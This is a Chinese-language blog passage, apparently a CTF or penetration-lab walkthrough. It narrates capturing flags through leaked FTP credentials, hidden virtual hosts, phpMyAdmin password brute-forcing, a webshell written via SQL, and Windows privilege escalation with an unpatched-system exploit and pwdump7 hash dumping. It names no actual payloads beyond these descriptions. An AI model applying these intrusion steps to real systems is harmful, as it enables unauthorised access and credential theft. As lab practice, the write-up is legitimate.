<p>即获得第二个flag<br><img src="http://ourd90bac.bkt.clouddn.com/f2.png" alt=""></p>
<p>然后打开第二个文件夹中的ftp软件，在用户设置页面获得第三个flag。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3.png" alt=""></p>
<h2 id="FTP利用"><a href="#FTP利用" class="headerlink" title="FTP利用"></a>FTP利用</h2><p>前三个flag拿得还是很轻松，基本的信息搜集就可以做到了，心里美滋滋。可是下一步怎么走就比较懵逼了。于是进一步进行搜集（瞎找）。</p>
<p>最后在压缩包的第二个.xml文件中找到了蛛丝马迹。因为这个xml文件是记录着ftp远程连接的用户名和密码，以前在服务器上大马利用ftp提权的时候会专门去找这个文件，这里发现这个文件应该是故意给出下一步渗透的提示，看来思路是正确的。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp.png" alt=""></p>
<p>找到对应的用户名：<em>admin</em>，解出对应的md5的密码。应该就可以进行远程登陆了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ftp2.png" alt=""></p>
<p>登录之后获得一个hosts.bak的文件。这一步本想是偷懒上传一个五次shift的cmd后门，但是发现ftp链接后的权限被限制为只能读取了，所以感觉比较可惜啊。没办法，只有老老实实把hosts文件复制到本地再研究下了。</p>
<blockquote>
<p>关于hosts文件：hosts文件是电脑中用于对域名进行解析的文件。它的优先级要大于DNS服务器。也就是说，电脑在访问网站时会先根据hosts文件中的域名解析信息寻找目标网址IP，如果没找到才会发给DNS服务器进行解析。</p>
</blockquote>
<p>hosts文件内容如下：</p>
<pre><code>`127.0.0.1 admin.hack.me

 127.0.0.1 cms.hack.me`
</code></pre><p>现在分析下：”127.0.0.1”是服务器的本地地址，也就是服务器内访问admin.hack.me 和cms.hack.me时会被解析到本地(localhost)，也就是说本地一定存在对应这两个网站的网站。（但我扫目录的时候咋没扫出来，至少扫出一个才正常啊…….）</p>
<p>于是将hosts文件内容替换到本地，将 127.0.0.1 替换成目标的IP地址。分别访问，出现以下两个页面：</p>
<p>一个是<em>phpmyadmin</em>管理登录页面;<br>另一个是<em>joomla cms</em>网站的页面;</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/admin.png" alt=""></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/cms.png" alt=""></p>
<p>cms网站看了很久，没有找到版本号，exp那条路基本上比较难，而慢慢测试漏洞去突破显然不如搞phpmyadmin来得好点。所以就暂时放了一放cms。</p>
<p>phpmyadmin这里找了很久没有再发现有什么好的提示，试了下默认密码和匿名登录都不行，那就只有硬着头皮进行弱口令爆破了。于是下载了个phpmyadmin爆破工具，加载字典跑，在经历了近十次的误报后终于爆出了密码，登录进去。发现了第四个<em>flag</em></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag3-3.png" alt=""></p>
<p>既然都拿到了root权限的数据库，那就可以找到刚才cms网站的后台密码进行登录，看有没有下一个flag或者在后天上传一句话getshell。<br>后来才发现网站的后台什么都没有，而且基本上没有发现可以很好地插一句话的地方。最后纠结了半天。才发现可以直接在数据库里直接写入一句句话，只要找到网站的绝对路径就可以了。而绝对路径在最初的<em>phpinfo()</em>页面就可以找到。</p>
<p>于是写入一句话：<br><img src="http://ourd90bac.bkt.clouddn.com/sql.png" alt=""></p>
<p>连上菜刀，getshell。并在网站根目录处拿到第五个<em>flag</em>。<br><img src="http://ourd90bac.bkt.clouddn.com/flag5-3.png" alt=""></p>
<hr>
<h2 id="服务器提权"><a href="#服务器提权" class="headerlink" title="服务器提权"></a>服务器提权</h2><p>既然拿到shell了，接下来就是常规的上大马提权服务器了。</p>
<blockquote>
<p>提权的思路一般有两种：1.利用服务器上高权限（主要指system权限）的服务进行提权；2.利用服务器的exp进行提权。</p>
</blockquote>
<p>一开始我想利用较为普遍的mysql数据库提权方式。但在试了udf、mof、nc反弹提权后均没有用，所得的用户都是users权限。最后只有看了下系统的补丁情况：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/system.png" alt=""></p>
<p>看来这下就可以利用大把的exp进行利用了。百度找到服务器没有打补丁的漏洞exp。利用成功。获取system权限，并创建属于administrator权限的用户，登录成功。</p>
<p>在管理员的文件夹中找到最后两个flag，其中一个加密。应该是要管理员密码。使用pwdump7找到密码的hash，解出hash。</p>
<p>打完收工。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
